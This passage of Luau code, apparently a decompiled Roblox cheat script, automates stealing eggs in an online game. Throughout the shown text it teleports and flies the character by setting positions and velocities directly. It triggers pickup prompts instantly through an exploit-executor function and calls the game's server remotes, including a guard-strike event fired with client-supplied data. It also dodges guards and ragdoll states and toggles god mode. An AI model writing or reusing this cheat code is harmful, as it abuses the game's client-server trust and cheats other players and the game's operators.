local n15 = math.max(arg4, 0.0041666666666666666)
local vector = Vector3.zero
if magnitude > 0.01 then
vector = n14.Unit * math.min(arg3, magnitude / n15)
end
local assemblyLinearVelocity = vector + Vector3.new(0, workspace.Gravity * n15 * 0.5, 0)
if magnitude > 2 then
if not arg5.mark then
arg5.mark = magnitude
arg5.clock = 0
end
arg5.clock = arg5.clock + arg4
if arg5.clock >= 0.4 then
if arg5.mark - magnitude < arg3 * 0.1 then
pcall(function()
arg.CFrame = arg.CFrame + n14.Unit * math.min(magnitude, arg3 * n15)
end)
end
arg5.mark = magnitude
arg5.clock = 0
end
else
arg5.mark = nil
end
pcall(function()
arg.AssemblyLinearVelocity = assemblyLinearVelocity
arg.AssemblyAngularVelocity = Vector3.zero
end)
return magnitude <= 0.5
end
fn22 = function()
local v20 = tbl4.Root()
if v20 then
pcall(function()
v20.AssemblyLinearVelocity = Vector3.zero
v20.AssemblyAngularVelocity = Vector3.zero
end)
end
end
local connection2 = nil
local tbl33 = {}
fn23 = function()
v19 = nil
if connection then
connection:Disconnect()
connection = nil
end
if connection2 then
connection2:Disconnect()
connection2 = nil
end
end
fn24 = function()
local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
return num ~= nil and num > workspace:GetServerTimeNow()
end
local flag3 = false
local function fn26()
if flag3 then
return true
end
return true
end
fn25 = function(arg, arg2)
v19 = arg
flag3 = arg2 == true
if connection or not arg then
return
end
tbl33 = {}
connection = RunService.Heartbeat:Connect(function()
if not v19 or fn26() or fn24() or tbl4.AntiGuard.Busy then
return
end
local v20 = tbl4.Root()
if not v20 then
return
end
pcall(function()
local rotation = v20.CFrame.Rotation
v20.CFrame = CFrame.new(v19) * rotation
v20.AssemblyLinearVelocity = Vector3.zero
v20.AssemblyAngularVelocity = Vector3.zero
end)
end)
connection2 = RunService.PreSimulation:Connect(function(deltaTime)
if not v19 or not fn26() or fn24() or tbl4.AntiGuard.Busy then
return
end
local v20 = tbl4.Root()
if v20 then
fn21(v20, v19, 400, deltaTime, tbl33)
end
end)
end
end
fn4(fn23)
local fn26
fn26 = function()
fn23()
tbl4.EndFlight()
tbl4.GodMode(false)
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if humanoid then
humanoid.PlatformStand = false
end
end
local n14, fn27, fn28
do
local n15 = 1.5
n14 = 0.6
local function fn29(arg, arg2)
local x = arg2.X
return (Vector3.new(arg.X, 0, arg.Z) - Vector3.new(x, 0, arg2.Z)).Magnitude
end
local function fn30(arg)
local ok, result = pcall(function()
return arg:GetPivot().Position
end)
return ok and result or nil
end
fn27 = function(arg, arg2, arg3)
local v19 = fn29(arg.Position, arg3)
local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
if areaEggSlotsClient then
for _, child in ipairs(areaEggSlotsClient:GetChildren()) do
if child:IsA("Model") and child.Name ~= arg2 then
local v20 = fn30(child)
if v20 and fn29(v20, arg.Position) + n15 < v19 then
return false
end
end
end
end
for _, child in ipairs(workspace:GetChildren()) do
if child:IsA("Model") and child.Name ~= arg2 and #child.Name == 32 and child:FindFirstChild("Hitbox") then
local v20 = fn30(child)
if v20 and fn29(v20, arg.Position) + n15 < v19 then
return false
end
end
end
return true
end
tbl4.Steal.WrongEgg = function(carryUid)
local steal = tbl4.Steal
if type(carryUid) ~= "string" or not steal.Carrying or steal.CarryUid == carryUid then
return false
end
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
pcall(eggState.DropFieldEgg, "PlayerRequest")
end
local n16 = 0
while steal.Carrying and n16 < 1 do
n16 += RunService.Heartbeat:Wait()
end
steal.Carrying = false
steal.CarryUid = carryUid
return true
end
fn28 = function(arg, arg2, arg3)
local n16 = arg3 or 14
local v19 = nil
local v20 = nil
for _, child in ipairs(workspace:GetChildren()) do
if child.Name == "SmartPromptPart" and child:IsA("BasePart") then
local carryAreaEgg = child:FindFirstChild("CarryAreaEgg")
if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") then
local v21 = fn29(child.Position, arg2)
if v21 < n16 then
n16 = v21
v19 = carryAreaEgg
v20 = child
end
end
end
end
if not v19 or not v20 then
return nil
end
if type(arg) == "string" and not fn27(v20, arg, arg2) then
return nil
end
return v19, v20
end
end
local fn29
fn29 = function(arg)
local eggState = tbl.EggState
if type(arg) == "string" and type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
pcall(eggState.CarryFieldEgg, arg)
end
end
local fn30
do
local function fn31()
local carryUid = tbl4.Steal.CarryUid
return type(carryUid) == "string" and carryUid or nil
end
local function fn32(arg)
local v19 = fn31()
if not v19 or type(arg) ~= "string" then
return true
end
return v19 == arg
end
local function fn33(arg)
if type(arg) ~= "string" then
return false
end
local v19 = fn20(false, true)
if #v19 == 0 then
return true
end
for _, v20 in ipairs(v19) do
if v20.Uid == arg then
return true
end
end
return false
end
local function fn34(arg)
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
pcall(eggState.DropFieldEgg, "PlayerRequest")
end
local n15 = 0
while tbl4.Steal.Carrying and n15 < 1 and not fn14(arg) do
n15 += RunService.Heartbeat:Wait()
end
end
fn30 = function(arg, arg2)
local n15 = 0
while not tbl4.Steal.Carrying and n15 < n14 and not fn14(arg2) do
n15 += RunService.Heartbeat:Wait()
end
if not tbl4.Steal.Carrying then
str3 = "The egg never reached the hand"
return false
end
if fn32(arg) then
return true
end
local v19 = fn31()
if fn33(v19) then
str3 = "Holding another egg that still matches, delivering it"
return true
end
str3 = "Wrong egg in hand, dropping it"
fn34(arg2)
return false
end
end
local fn31
fn31 = function(arg, arg2)
local eggState = tbl.EggState
local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
if not position then
return false
end
local n15 = 0
local huge = math.huge
local n16 = 0
while n15 < 1.5 do
if fn14(arg2) then
return false
end
if tbl4.Steal.Carrying and not tbl4.Steal.WrongEgg(arg.Uid) then
return true
end
if huge >= 0.06 then
local v19 = fn28(arg.Uid, position)
if v19 then
pcall(function()
v19.HoldDuration = 0
end)
n16 = 0
if typeof(fireproximityprompt) == "function" then
pcall(fireproximityprompt, v19)
end
else
n16 += 1
if n16 >= 4 then
return false
end
if type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
pcall(eggState.CarryFieldEgg, arg.Uid)
end
end
huge = 0
end
local result = RunService.Heartbeat:Wait()
n15 += result
huge += result
end
return tbl4.Steal.Carrying == true
end
local fn32
local v19 = fn2(function()
return ReplicatedStorage.Shared.Modules.Ragdoll
end)
fn32 = function()
local character = localPlayer.Character
if type(v19) == "table" and type(v19.IsRagdolled) == "function" then
local ok, result = pcall(v19.IsRagdolled, character)
if ok and result == true then
return true
end
end
local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
if num and num > workspace:GetServerTimeNow() then
return true
end
character = character and character:FindFirstChildOfClass("Humanoid")
if character then
local state = character:GetState()
return state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown
end
return false
end
local fn33
fn33 = function(arg, arg2)
if tbl4.Steal.Carrying then
return true
end
local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
return false
end
local n15 = 0
while n15 < 1 do
if fn14(arg2) or tbl4.Steal.Carrying then
return tbl4.Steal.Carrying == true
end
local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
local records = ok and type(result) == "table" and result.Records or nil
if type(records) == "table" then
local flag3 = false
for _, record in pairs(records) do
if type(record) == "table" and record.Uid == arg and (record.State == "Slot" or record.State == "Dropped") then
flag3 = true
break
end
end
if not flag3 then
return tbl4.Steal.Carrying == true
end
end
n15 += task.wait(0.3)
end
return tbl4.Steal.Carrying == true
end
local fn34
local function fn35(arg)
local v20 = tbl4.Root()
local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
if not v20 or not position then
return math.huge
end
return (v20.Position - position).Magnitude
end
fn34 = function(arg)
local v20, v21, v22 = ipairs(arg)
local huge = math.huge
local v23 = nil
for _, v24 in v20, v21, v22 do
local v25 = fn35(v24)
if v25 < huge then
huge = v25
v23 = v24
end
end
return v23, huge
end
local n15
n15 = 20
local n16
n16 = 90
local fn36, stealHome, fn37, fn38, fn39, n17
do
local n18 = 6
fn36 = function(arg, arg2, arg3, arg4, arg5, arg6)
fn23()
local v20 = tbl4.Root()
if not v20 then
return false
end
local character = localPlayer.Character
local position = v20.Position
local tbl33 = {}
local position2 = nil
local flag3 = nil
local str4 = nil
local n19 = 0
local function fn40()
if arg4 ~= nil then
return true
end
return true
end
local function fn41(arg7)
n19 += arg7
if fn14(arg2) then
flag3 = false
return nil
end
if arg3 and not tbl4.Steal.Carrying then
flag3 = false
str4 = "dropped"
return nil
end
if arg6 then
local v21 = arg6()
if v21 then
flag3 = false
str4 = v21
return nil
end
end
local v21 = tbl4.Root()
if not v21 or n19 >= 25 or localPlayer.Character ~= character then
flag3 = false
str4 = "respawned"
return nil
end
return v21
end
local connection = RunService.Heartbeat:Connect(function(deltaTime)
if flag3 ~= nil or fn40() or tbl4.AntiGuard.Busy then
return
end
local v21 = fn41(deltaTime)
if not v21 then
return
end
if n13 < (v21.Position - position).Magnitude then
if arg5 then
flag3 = false
str4 = "displaced"
return
end
position = v21.Position
end
local n20 = (arg4 or 400) * (os.clock() < (tbl4.SafeCarry.SlowUntil or 0) and tbl4.SafeCarry.SlowFactor or 1)
local n21
if tbl4.SafeCarry.Enabled and tbl4.SafeCarry.Pace then
n21 = math.min(n20, tbl4.SafeCarry.Pace())
else
n21 = n20
end
local n22 = arg - position
local n23 = n21 * deltaTime
local flag4 = n22.Magnitude <= math.max(n23, 0.05)
position = flag4 and arg or position + n22.Unit * n23
local vector = Vector3.new(n22.X, 0, n22.Z)
local cframe = vector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector.Unit) or v21.CFrame.Rotation
pcall(function()
v21.CFrame = CFrame.new(position) * cframe
v21.AssemblyLinearVelocity = Vector3.zero
v21.AssemblyAngularVelocity = Vector3.zero
end)
if flag4 then
flag3 = true
end
end)
local connection2 = RunService.PreSimulation:Connect(function(deltaTime)
if flag3 ~= nil or not fn40() or tbl4.AntiGuard.Busy then
return
end
local v21 = fn41(deltaTime)
if not v21 then
return
end
local n20 = (arg4 or 400) * (os.clock() < (tbl4.SafeCarry.SlowUntil or 0) and tbl4.SafeCarry.SlowFactor or 1)
local n21
if tbl4.SafeCarry.Enabled and tbl4.SafeCarry.Pace then
n21 = math.min(n20, tbl4.SafeCarry.Pace())
else
n21 = n20
end
if arg5 and position2 and (v21.Position - position2).Magnitude > n13 + n21 * deltaTime then
flag3 = false
str4 = "displaced"
return
end
if fn21(v21, arg, n21, deltaTime, tbl33) then
flag3 = true
end
position2 = v21.Position
position = v21.Position
end)
while flag3 == nil do
RunService.Heartbeat:Wait()
end
connection:Disconnect()
connection2:Disconnect()
if fn40() and not flag3 then
fn22()
end
if flag3 then
fn25(arg, arg4 ~= nil)
end
return flag3, str4
end
local tbl33 = {
{
Path = { "GearGiver_Slap", "Podium" },
Offset = Vector3.new(-16.415, 21.072, -6.106),
},
{
Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
Offset = Vector3.new(-26.776, 1.75, 18.665),
},
{
Path = { "__OBJECTS", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
Offset = Vector3.new(-26.776, 1.75, 18.665),
},
}
stealHome = function()
for _, v20 in ipairs(tbl33) do
local v21 = workspace
for _, v22 in ipairs(v20.Path) do
v21 = v21 and v21:FindFirstChild(v22) or nil
end
if v21 and v21:IsA("BasePart") then
return v21.CFrame:PointToWorldSpace(v20.Offset)
end
end
return Vector3.new(528.7, 70.57, -364.11)
end
tbl4.StealHome = stealHome
tbl4.InsideBase = function(arg)
if not arg then
arg = tbl4.Root()
arg = arg and arg.Position
end
if arg == nil then
return false
end
local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
world = world and world:FindFirstChild("Areas")
world = world and world:FindFirstChild("SeparationLine")
return arg.X < (world and world:IsA("BasePart") and world.Position.X or 552)
end
local function fn40(arg)
if tbl4.AntiGuard.Busy then
return false
end
local character = localPlayer.Character
local v20 = tbl4.Root()
if not character or not v20 then
return false
end
local rotation = v20.CFrame.Rotation
local cFrame = CFrame.new(arg) * rotation
pcall(function()
character:PivotTo(cFrame)
end)
if (v20.Position - arg).Magnitude > 3 then
pcall(function()
v20.CFrame = cFrame
end)
end
for _, descendant in ipairs(character:GetDescendants()) do
if descendant:IsA("BasePart") then
pcall(function()
descendant.AssemblyLinearVelocity = Vector3.zero
descendant.AssemblyAngularVelocity = Vector3.zero
end)
end
end
return true
end
local function fn41(arg)
if tbl4.AntiGuard.Busy then
return
end
local character = localPlayer.Character
local v20 = tbl4.Root()
if not character or not v20 or not arg then
return
end
if (v20.Position - arg).Magnitude > 6 then
fn40(arg)
return
end
for _, descendant in ipairs(character:GetDescendants()) do
if descendant:IsA("BasePart") and descendant ~= v20 and (descendant.Position - v20.Position).Magnitude > 12 then
pcall(function()
descendant.CFrame = v20.CFrame
descendant.AssemblyLinearVelocity = Vector3.zero
end)
end
end
end
local function fn42(arg, arg2)
local n19 = 0
while true do
if not (n19 < n18) then
return not fn14(arg)
else
if fn14(arg) then
break
end
local character = localPlayer.Character
local flag3 = fn32()
if not flag3 and character then
for _, descendant in ipairs(character:GetDescendants()) do
if descendant:IsA("Constraint") and string.find(descendant.Name, "RagdollConstraint", 1, true) then
flag3 = true
break
end
end
end
if not flag3 then
return not fn14(arg)
end
fn41(arg2)
n19 += RunService.Heartbeat:Wait()
end
end
return false
end
local function fn43(arg)
local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
world = world and world:FindFirstChild("Areas")
world = world and world:FindFirstChild("GuardAreas")
local areaId = world and arg and arg.AreaId and world:FindFirstChild(arg.AreaId)
return areaId and areaId:FindFirstChild("Guard") or nil
end
fn37 = function(arg)
local v20 = fn43(arg)
return v20 ~= nil and v20:GetAttribute("GuardState") == "Sleeping"
end
local n19 = 3
fn38 = function(arg)
local v20 = fn43(arg)
local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
if not v20 or not position then
return nil, nil
end
local ok, result = pcall(function()
return v20:GetPivot().Position
end)
if not ok then
return nil, nil
end
local vector = Vector3.new(position.X - result.X, 0, position.Z - result.Z)
if vector.Magnitude < 0.1 then
return nil, nil
end
local n20 = result + vector.Unit * n19
return Vector3.new(n20.X, position.Y + 3, n20.Z), result
end
local function fn44(arg, arg2)
local tbl34 = { Landed = false, Destination = arg2 }
local antiGuard = tbl4.AntiGuard
antiGuard.HitArms = antiGuard.HitArms + 1
tbl4.AntiGuard.HitArmedAt = os.clock()
tbl34.Link = localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
if tbl34.Landed or fn14(arg) then
return
end
local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
if not num or num <= workspace:GetServerTimeNow() then
return
end
local v20 = tbl4.Root()
if not v20 then
return
end
tbl34.Landed = true
fn23()
tbl4.SafeCarry.JumpDistance = (tbl34.Destination - v20.Position).Magnitude
tbl4.SafeCarry.JumpAt = os.clock()
pcall(function()
v20.CFrame = CFrame.new(tbl34.Destination)
v20.AssemblyLinearVelocity = Vector3.zero
end)
end)
tbl34.Stop = function()
if tbl34.Link then
tbl34.Link:Disconnect()
tbl34.Link = nil
tbl4.AntiGuard.HitArms = math.max(0, tbl4.AntiGuard.HitArms - 1)
end
end
return tbl34
end
fn39 = function(arg, arg2, arg3)
local character = localPlayer.Character
character = character and character:FindFirstChildOfClass("Humanoid")
if character then
character.PlatformStand = false
end
local n20 = 0
local v20 = nil
while not arg2.Landed and n20 < n15 do
if fn14(arg) then
break
end
if arg3 then
arg3(arg2)
end
if not tbl4.Steal.Carrying then
local v21 = v20 or n20
if n20 - v21 > 1 then
break
end
v20 = v21
end
n20 += RunService.Heartbeat:Wait()
end
arg2.Stop()
return arg2.Landed
end
n17 = 20
local function fn45(arg, arg2, arg3, arg4)
local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
if not position then
return false
end
local n20 = 0
local huge = math.huge
while n20 < arg3 do
if fn14(arg2) then
return false
end
if tbl4.Steal.Carrying and not tbl4.Steal.WrongEgg(arg.Uid) then
return true
end
if huge >= 0.1 then
local v20 = fn28(arg.Uid, position)
if v20 then
pcall(function()
v20.HoldDuration = 0
end)
if typeof(fireproximityprompt) == "function" then
pcall(fireproximityprompt, v20)
end
else
fn29(arg.Uid)
end
huge = 0
end
if arg4 then
fn41(arg4)
end
local result = RunService.Heartbeat:Wait()
n20 += result
huge += result
end
return tbl4.Steal.Carrying == true
end
local function fn46(arg, arg2, arg3, arg4)
local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
if not position then
return false
end
local n20 = position + Vector3.new(0, 3, 0)
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if humanoid and character:FindFirstChildWhichIsA("Tool") then
pcall(function()
humanoid:UnequipTools()
end)
end
if arg3 then
fn25(n20, true)
str3 = "Waiting to stand up"
if not fn42(arg2, n20) then
return false
end
if tbl4.SafeCarry.Enabled and arg4 == nil and tbl4.SafeCarry.Settle then
if not tbl4.SafeCarry.Settle(arg2, arg) then
return false
end
end
else
str3 = "Jumping to the egg"
local v20 = tbl4.Root()
if v20 and (n20 - v20.Position).Magnitude <= n16 then
pcall(function()
local rotation = v20.CFrame.Rotation
v20.CFrame = CFrame.new(n20) * rotation
v20.AssemblyLinearVelocity = Vector3.zero
v20.AssemblyAngularVelocity = Vector3.zero
end)
elseif not fn36(n20, arg2, nil, 400) then
return false
end
end
if fn14(arg2) then
return false
end
local flag3 = arg4 and typeof(arg4.CFrame) == "CFrame"
local v20 = nil
if flag3 then
v20 = fn44(arg2, arg4.CFrame.Position + Vector3.new(0, 3, 0))
end
local str4 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
local flag4 = type(arg.Uid) == "string" and string.sub(arg.Uid, 1, #str4) == str4 and string.match(arg.Uid, "_([%w ]+:Slot_%d+)$") or nil
arg4 = arg4 and flag4
local flag5 = false
if arg4 then
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
str3 = "Taking the starter egg"
task.spawn(function()
pcall(eggState.CarryFieldEgg, arg.Uid, flag4)
end)
local n21 = 0
while not tbl4.Steal.Carrying and n21 < 0.8 do
if fn14(arg2) then
return false
end
n21 += RunService.Heartbeat:Wait()
end
flag5 = tbl4.Steal.Carrying == true
end
end
if not flag5 then
str3 = "Taking the egg"
flag5 = fn31(arg, arg2)
if not flag5 and not fn14(arg2) then
fn36(n20, arg2, nil, 400)
flag5 = fn31(arg, arg2)
end
end
if not flag5 and not fn33(arg.Uid, arg2) then
if v20 then
v20.Stop()
end
tbl32[arg.Uid] = os.clock() + n10
str3 = "That egg would not come free"
return false
end
if v20 then
local reGuardPatrolForestStrike = networking:FindFirstChild("RE/GuardPatrol/ForestStrike")
local v21 = fn43(arg) or fn43({ AreaId = "Forest" })
local humanoidRootPart = v21 and v21:FindFirstChild("HumanoidRootPart")
if reGuardPatrolForestStrike and reGuardPatrolForestStrike:IsA("RemoteEvent") and humanoidRootPart then
str3 = "Calling the guard strike"
pcall(function()
reGuardPatrolForestStrike:FireServer({ EggUid = arg.Uid, GuardCFrame = humanoidRootPart.CFrame })
end)
end
end
tbl4.Steal.LastFinishedAt = os.clock()
return true, v20
end
local huge = math.huge
local huge2 = math.huge
local function fn47(arg, arg2, arg3)
local v20 = nil
local v21 = nil
for _, child in ipairs(workspace:GetChildren()) do
if child.Name == "SmartPromptPart" and child:IsA("BasePart") then
local carryAreaEgg = child:FindFirstChild("CarryAreaEgg")
if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") then
local magnitude = (child.Position - arg).Magnitude
if magnitude < arg2 then
arg2 = magnitude
v20 = carryAreaEgg
v21 = child
end
end
end
end
if v20 and v21 and type(arg3) == "string" and not fn27(v21, arg3, arg) then
return nil
end
return v20, v21
end
local function fn48(arg)
local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
local v20 = workspace:FindFirstChild(arg) or areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)
if not v20 then
return nil
end
local ok, result = pcall(function()
return v20:GetPivot().Position
end)
return ok and result or nil
end
local function fn49(arg)
local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
return nil
end
local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
local records = ok and type(result) == "table" and result.Records or nil
if type(records) ~= "table" then
return nil
end
for _, record in pairs(records) do
if type(record) == "table" and record.Uid == arg and typeof(record.BottomCFrame) == "CFrame" then
return record.BottomCFrame.Position, true
end
end
return nil, true
end
local function fn50(arg)
local v20 = workspace:FindFirstChild(arg)
if not v20 then
return false
end
for _, descendant in ipairs(v20:GetDescendants()) do
if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
local ok, result, result2 = pcall(function()
return descendant.Part0, descendant.Part1
end)
if ok then
for _, v21 in ipairs({ result, result2 }) do
if typeof(v21) == "Instance" and not v21:IsDescendantOf(v20) then
local model = v21:FindFirstAncestorOfClass("Model")
if model and model ~= localPlayer.Character and Players:GetPlayerFromCharacter(model) then
return true
end
end
end
end
end
end
return false
end
local function fn51(arg, arg2)
local state = 1
local v20, v21, carryUid, n20, vector, connection, n21, n22, huge3, v22, v23, n23, huge4, flag3, v24, v25, v26, v27, now, flag4, n24, flag5, v28
while true do
if state == 1 then
v20 = arg
v21 = arg2
if v21 then
state = 3
else
state = 2
end
elseif state == 2 then
carryUid = tbl4.Steal.CarryUid
state = 4
elseif state == 3 then
carryUid = v21
state = 4
elseif state == 4 then
if type(carryUid) ~= "string" then
state = 51
else
state = 5
end
elseif state == 5 then
fn23()
str3 = "Following the egg"
n20 = nil
vector = Vector3.zero
connection = RunService.PreSimulation:Connect(function(deltaTime)
local v29 = tbl4.Root()
if not v29 or not n20 or tbl4.Steal.Carrying or fn14(v20) then
return
end
if fn24() then
if not tbl4.SafeCarry.Enabled and (v29.Position - n20).Magnitude > 2 then
fn40(n20)
end
return
end
local n25 = math.max(deltaTime, 0.0041666666666666666)
local n26 = vector + (n20 - v29.Position) / math.max(0.08, n25)
local enabled = tbl4.SafeCarry.Enabled and tbl4.SafeCarry.Pace() or n8 + vector.Magnitude
if enabled < n26.Magnitude then
n26 = n26.Unit * enabled
end
local assemblyLinearVelocity = n26 + Vector3.new(0, workspace.Gravity * n25 * 0.5, 0)
pcall(function()
v29.AssemblyLinearVelocity = assemblyLinearVelocity
v29.AssemblyAngularVelocity = Vector3.zero
end)
end)
n21 = 0
n22 = 0
huge3 = math.huge
v22 = nil
v23 = nil
n23 = 0
huge4 = math.huge
state = 6
elseif state == 6 then
flag3 = false
if not (n21 < huge2) then
state = 48
else
state = 7
end
elseif state == 7 then
if fn14(v20) then
state = 48
else
state = 8
end
elseif state == 8 then
if tbl4.Steal.Carrying then
state = 9
else
state = 12
end
elseif state == 9 then
if tbl4.Steal.WrongEgg(carryUid) then
state = 11
else
state = 10
end
elseif state == 10 then
flag3 = true
state = 48
elseif state == 11 then
str3 = "Picked up the wrong egg, dropped it"
state = 12
elseif state == 12 then
v24 = tbl4.Root()
if not v24 then
state = 48
else
state = 13
end
elseif state == 13 then
v25 = fn48(carryUid)
if v25 then
state = 22
else
state = 14
end
elseif state == 14 then
if huge3 >= 0.5 then
state = 15
else
state = 23
end
elseif state == 15 then
v26, v27 = fn49(carryUid)
if v26 then
state = 21
else
state = 16
end
elseif state == 16 then
huge3 = 0
if v27 then
state = 18
else
state = 17
end
elseif state == 17 then
v25 = v26
state = 23
elseif state == 18 then
n22 += 1
if not (n22 >= 4) then
state = 20
else
state = 19
end
elseif state == 19 then
str3 = "The egg is gone"
state = 48
elseif state == 20 then
v25 = v26
state = 23
elseif state == 21 then
n22 = 0
huge3 = 0
v25 = v26
state = 23
elseif state == 22 then
n22 = 0
state = 23
elseif state == 23 then
if v25 then
state = 24
else
state = 33
end
elseif state == 24 then
now = os.clock()
if v22 then
state = 26
else
state = 25
end
elseif state == 25 then
flag4 = v22
state = 27
elseif state == 26 then
flag4 = v23
state = 27
elseif state == 27 then
if flag4 then
state = 28
else
state = 29
end
elseif state == 28 then
flag4 = now > v23
state = 29
elseif state == 29 then
if flag4 then
state = 30
else
state = 32
end
elseif state == 30 then
n24 = (v25 - v22) / math.max(now - v23, 0.0041666666666666666)
if not (n24.Magnitude < 3000) then
state = 32
else
state = 31
end
elseif state == 31 then
vector = vector:Lerp(n24, 0.3)
state = 32
elseif state == 32 then
n20 = v25 + Vector3.new(0, 3, 0)
v22 = v25
v23 = now
state = 33
elseif state == 33 then
if not (n23 >= 0.4) then
state = 37
else
state = 34
end
elseif state == 34 then
if fn50(carryUid) then
state = 36
else
state = 35
end
elseif state == 35 then
str3 = "Egg dropped, taking it back"
n23 = 0
state = 37
elseif state == 36 then
str3 = "Another player has the egg, following it until it drops"
n23 = 0
state = 37
elseif state == 37 then
if n20 then
state = 39
else
state = 38
end
elseif state == 38 then
flag5 = n20
state = 40
elseif state == 39 then
flag5 = (n20 - v24.Position).Magnitude <= n17
state = 40
elseif state == 40 then
if flag5 then
state = 41
else
state = 42
end
elseif state == 41 then
flag5 = huge4 >= 0.1
state = 42
elseif state == 42 then
if flag5 then
state = 43
else
state = 47
end
elseif state == 43 then
v28 = fn47(n20 - Vector3.new(0, 3, 0), 6, carryUid)
if v28 then
state = 45
else
state = 44
end
elseif state == 44 then
task.spawn(fn29, carryUid)
huge4 = 0
state = 47
elseif state == 45 then
pcall(function()
v28.HoldDuration = 0
end)
huge4 = 0
if typeof(fireproximityprompt) ~= "function" then
state = 47
else
state = 46
end
elseif state == 46 then
pcall(fireproximityprompt, v28)
state = 47
elseif state == 47 then
local result = RunService.Heartbeat:Wait()
n21 += result
huge4 += result
huge3 += result
n23 += result
state = 6
elseif state == 48 then
connection:Disconnect()
fn22()
if flag3 then
state = 50
else
state = 49
end
elseif state == 49 then
flag3 = tbl4.Steal.Carrying == true
state = 50
elseif state == 50 then
return flag3
elseif state == 51 then
return false
end
end
end
local function fn52(arg, arg2)
local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
if not position then
return false
end
if tbl4.InsideBase() and not tbl4.InsideBase(position) then
local v20 = stealHome()
if v20 then
str3 = "Leaving the base through the safe zone"
if not fn36(v20 + Vector3.new(0, 3, 0), arg2, nil, 400) then
return false
end
end
end
str3 = "Flying to the egg"
if not fn36(position + Vector3.new(0, 3, 0), arg2, nil, 400) then
return false
end
str3 = "Taking the egg"
local v20 = fn45(arg, arg2, 0.6, nil)
if not v20 and not fn14(arg2) then
v20 = fn31(arg, arg2)
end
if not v20 and not fn33(arg.Uid, arg2) then
tbl32[arg.Uid] = os.clock() + n10
return false
end
tbl4.Steal.LastFinishedAt = os.clock()
return true
end
local tbl34 = { Uid = nil, Freed = nil, Token = nil }
local n20 = 3
local function fn53()
local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
world = world and world:FindFirstChild("Areas")
world = world and world:FindFirstChild("GuardAreas")
local v20 = tbl4.Root()
if not world or not v20 then
return nil
end
local str4 = tostring(localPlayer.UserId)
local carryAreaId = tbl4.Steal.CarryAreaId and fn43({ AreaId = tostring(tbl4.Steal.CarryAreaId) }) or nil
local huge3 = math.huge
local v21 = nil
for _, child in ipairs(world:GetChildren()) do
local guard = child:FindFirstChild("Guard")
if guard then
if tostring(guard:GetAttribute("TargetPlayer")) == str4 or tostring(guard:GetAttribute("WakeTargetPlayer")) == str4 then
return guard
end
local ok, result = pcall(function()
return guard:GetPivot().Position
end)
if ok then
local magnitude = (result - v20.Position).Magnitude
if magnitude < huge3 then
v21 = guard
huge3 = magnitude
end
end
end
end
return carryAreaId or v21
end
local function fn54(arg, arg2, arg3)
local v20 = fn53()
if not v20 then
return false
end
local v21 = fn44(arg, arg3 + Vector3.new(0, 3, 0))
local n21 = 0
while true do
if not v21.Landed and n21 < n15 and not fn14(arg) then
local ok, result = pcall(function()
return v20:GetPivot().Position
end)
local v22 = tbl4.Root()
if not (not ok or not v22) then
if (result - v22.Position).Magnitude > n19 + 5 then
local vector = Vector3.new(v22.Position.X - result.X, 0, v22.Position.Z - result.Z)
local n22 = result + (vector.Magnitude > 0.1 and vector.Unit * n19 or Vector3.zero)
fn36(Vector3.new(n22.X, result.Y + 3, n22.Z), arg, nil, 400, true, function()
if v21.Landed then
return "hit"
end
return nil
end)
end
n21 += RunService.Heartbeat:Wait()
continue
end
end
break
end
v21.Stop()
if not v21.Landed then
return false
end
return fn51(arg, arg2)
end
tbl4.SafeCarry.Dangers = {}
tbl4.SafeCarry.DangerAt = 0
tbl4.SafeCarry.RefreshDangers = function()
local safeCarry = tbl4.SafeCarry
local dangerAt = safeCarry.DangerAt
if os.clock() - dangerAt < 1 then
return safeCarry.Dangers
end
safeCarry.DangerAt = os.clock()
local dangers = {}
local function fn55(arg)
local ok, result, result2 = pcall(function()
if arg:IsA("Model") then
return arg:GetBoundingBox()
end
